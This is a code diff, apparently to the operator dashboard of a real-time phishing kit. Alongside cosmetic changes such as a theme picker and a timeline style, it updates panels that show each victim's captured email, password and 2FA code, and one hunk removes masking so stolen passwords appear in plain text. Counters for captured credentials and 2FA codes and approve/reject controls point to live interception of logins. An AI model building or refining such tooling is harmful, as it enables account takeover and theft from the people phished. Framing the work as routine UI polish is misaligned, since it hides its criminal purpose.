@@ -315,6 +315,24 @@
         .timeline {
             display: flex; align-items: center; gap: 0;
             margin-top: 16px;
+            position: relative;
+        }
+        
+        .timeline::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 60px;
+            right: 60px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--success), var(--primary), var(--border));
+            border-radius: 2px;
+            z-index: 0;
+        }
+        
+        .timeline-step {
+            display: flex; align-items: center; gap: 0;
+            margin-top: 16px;
         }
         
         .timeline-step {
@@ -476,9 +494,9 @@
                     <span class="icon">📏</span>
                     Compact Mode
                 </div>
-                <div class="nav-item" onclick="toggleTheme()">
-                    <span class="icon">🌙</span>
-                    Dark Mode
+                <div class="nav-item" onclick="showPage('themes', this)">
+                    <span class="icon">🎨</span>
+                    Themes
                 </div>
             </div>
         </div>
@@ -740,11 +758,73 @@
                     </div>
                 </div>
             </div>
+            
+            <!-- Themes Page -->
+            <div class="page" id="page-themes">
+                <div style="margin-bottom: 32px;">
+                    <div class="card-title" style="margin-bottom: 16px;">Choose Your Theme</div>
+                    <p style="color: var(--text-secondary); margin-bottom: 24px;">Select a color theme for your dashboard</p>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px;">
+                    <div class="theme-card" onclick="setTheme('purple')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #6366f1, #818cf8); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Purple Dream</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Default purple theme</div>
+                    </div>
+                    
+                    <div class="theme-card" onclick="setTheme('blue')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #3b82f6, #60a5fa); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Ocean Blue</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Calm blue tones</div>
+                    </div>
+                    
+                    <div class="theme-card" onclick="setTheme('green')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #10b981, #34d399); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Forest Green</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Nature-inspired</div>
+                    </div>
+                    
+                    <div class="theme-card" onclick="setTheme('orange')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #f59e0b, #fbbf24); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Sunset Orange</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Warm and energetic</div>
+                    </div>
+                    
+                    <div class="theme-card" onclick="setTheme('pink')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #ec4899, #f472b6); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Rose Pink</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Soft and elegant</div>
+                    </div>
+                    
+                    <div class="theme-card" onclick="setTheme('dark')" style="cursor: pointer;">
+                        <div style="height: 120px; background: linear-gradient(135deg, #1e293b, #334155); border-radius: 16px; margin-bottom: 16px;"></div>
+                        <div style="font-weight: 600;">Midnight Dark</div>
+                        <div style="font-size: 12px; color: var(--text-secondary);">Dark mode classic</div>
+                    </div>
+                </div>
+                
+                <style>
+                    .theme-card {
+                        background: var(--surface);
+                        border-radius: 20px;
+                        padding: 20px;
+                        border: 2px solid var(--border);
+                        transition: all 0.3s var(--ease-spring);
+                    }
+                    .theme-card:hover {
+                        transform: translateY(-4px);
+                        border-color: var(--primary);
+                        box-shadow: 0 12px 24px -8px rgba(0,0,0,0.15);
+                    }
+                </style>
+            </div>
         </div>
     </div>
     
     <script>
         let totalCreds = 0, total2fa = 0, approved = 0, rejected = 0;
+        let sessionStartTime = null;
         let activityLog = [];
         let compactMode = localStorage.getItem('compactMode') === 'true';
         
@@ -779,9 +859,29 @@
             savePreference('compactMode', compactMode);
         }
         
-        function toggleTheme() {
-            alert('Dark mode coming soon!');
+        function setTheme(themeName) {
+            const themes = {
+                purple: { primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5' },
+                blue: { primary: '#3b82f6', primaryLight: '#60a5fa', primaryDark: '#2563eb' },
+                green: { primary: '#10b981', primaryLight: '#34d399', primaryDark: '#059669' },
+                orange: { primary: '#f59e0b', primaryLight: '#fbbf24', primaryDark: '#d97706' },
+                pink: { primary: '#ec4899', primaryLight: '#f472b6', primaryDark: '#db2777' },
+                dark: { primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5' }
+            };
+            
+            const theme = themes[themeName];
+            document.documentElement.style.setProperty('--primary', theme.primary);
+            document.documentElement.style.setProperty('--primary-light', theme.primaryLight);
+            document.documentElement.style.setProperty('--primary-dark', theme.primaryDark);
+            
+            localStorage.setItem('admin_theme', themeName);
+            showToast('Theme: ' + themeName.charAt(0).toUpperCase() + themeName.slice(1));
+            addActivity('Changed theme to ' + themeName);
         }
+        
+        // Load saved theme
+        const savedTheme = localStorage.getItem('admin_theme');
+        if (savedTheme) setTheme(savedTheme);
         
         function globalSearch() {
             const query = document.getElementById('globalSearch').value.toLowerCase();
@@ -962,23 +1062,26 @@
                     document.getElementById('live-2fa-field').style.display = 'none';
                 }
                 
-                // Timeline
-                document.getElementById('timeline-login').classList.add('completed');
-                if (state.status === 'waiting_2fa') {
-                    document.getElementById('timeline-2fa').classList.add('active');
+                // Timeline - update based on current state
+                document.getElementById('timeline-login').className = 'timeline-step completed';
+                document.getElementById('timeline-2fa').className = 'timeline-step' + (state.status === 'waiting_2fa' ? ' active' : '');
+                document.getElementById('timeline-decision').className = 'timeline-step';
+                
+                // Session duration - only set start time on first appearance
+                if (!sessionStartTime && state.timestamp) {
+                    sessionStartTime = new Date(state.timestamp);
                 }
                 
-                // Session duration
-                if (state.timestamp) {
-                    const start = new Date(state.timestamp);
+                if (sessionStartTime) {
                     const now = new Date();
-                    const mins = Math.floor((now - start) / 60000);
-                    const secs = Math.floor(((now - start) % 60000) / 1000);
+                    const diff = now - sessionStartTime;
+                    const mins = Math.floor(diff / 60000);
+                    const secs = Math.floor((diff % 60000) / 1000);
                     document.getElementById('session-time').textContent = mins + ':' + secs.toString().padStart(2, '0');
                 }
                 
                 document.getElementById('victim-email-display').textContent = state.email || '-';
-                document.getElementById('victim-password-display').textContent = state.password ? '••••••••' : '-';
+                document.getElementById('victim-password-display').textContent = state.password || '-';
                 document.getElementById('victim-2fa-display').textContent = state['2fa_code'] || '-';
                 
                 addActivity('Victim: ' + (state.email || 'Unknown'));
@@ -1019,6 +1122,8 @@
                 victimStatus.textContent = 'No active victim';
                 victimBadge.textContent = 'Idle';
                 victimBadge.className = 'tool-status idle';
+                sessionStartTime = null;
+                document.getElementById('session-time').textContent = '0:00';
             }
             
             // Analytics
